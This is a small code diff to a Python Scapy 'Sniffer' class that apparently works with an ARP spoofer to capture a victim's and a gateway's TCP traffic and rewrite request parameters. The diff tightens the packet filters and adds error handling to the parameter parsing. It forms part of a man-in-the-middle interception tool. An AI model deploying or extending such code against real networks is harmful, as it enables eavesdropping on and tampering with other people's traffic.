@@ -16,14 +16,14 @@ class Sniffer:
         self.spoofer.start()
 
     def victim_filter(self, packet):
-        return IP in packet and packet[IP].src == self.spoofer.targetIP and Raw in packet
+        return IP in packet and packet[IP].src == self.spoofer.targetIP and Raw in packet and TCP in packet
 
     def receive_victim(self):
         p = sniff(count=1, lfilter=self.victim_filter)
         return p
 
     def router_filter(self, packet):
-        return IP in packet and packet[IP].src == self.spoofer.gatewayIP
+        return IP in packet and packet[IP].src == self.spoofer.gatewayIP and Raw in packet and TCP in packet
 
     def receive_router(self):
         p = sniff(count=1, lfilter=self.router_filter)
@@ -57,9 +57,12 @@ class Sniffer:
         return list[0]
 
     def find_req_param(self, packet):
-        txt = packet[Raw].load
-        list = txt.split()
-        return list[1]
+        try:
+            txt = packet[Raw].load
+            list = txt.split()
+            return list[1]
+        except:
+            return " "
 
     def change_req_params(self, req_params, packet):
         txt = packet[Raw].load
